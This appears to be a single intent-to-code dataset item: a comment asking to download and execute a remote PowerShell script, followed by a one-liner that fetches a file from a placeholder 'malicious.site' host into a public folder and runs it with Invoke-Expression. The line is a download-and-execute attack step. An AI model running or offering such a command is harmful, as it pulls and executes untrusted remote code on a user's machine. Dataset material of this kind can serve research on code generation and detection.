# Natural language intent:
# Download a PowerShell script from a remote URL and execute it.

Invoke-WebRequest -Uri 'http://malicious.site/malicious_script.ps1' -OutFile 'C:\Users\Public\malicious_script.ps1'; Invoke-Expression 'C:\Users\Public\malicious_script.ps1'
